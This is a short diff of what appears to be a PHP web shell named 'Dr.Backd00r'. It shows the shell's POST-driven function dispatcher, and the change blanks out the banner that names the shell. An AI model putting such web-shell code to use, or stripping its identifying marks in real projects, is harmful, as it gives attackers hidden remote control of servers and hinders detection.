@@ -1414,6 +1414,6 @@ if( empty($_POST['a']) )
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ) 
     call_user_func('action' . $_POST['a']); 
 ?> 
-<div id="cot_tl_fixed"><marquee>Shell - *Dr.Backd00r*  - SubhashDasyam.com</marquee></div> 
+<div id="cot_tl_fixed"><marquee></marquee></div> 
  </marquee></div>
 
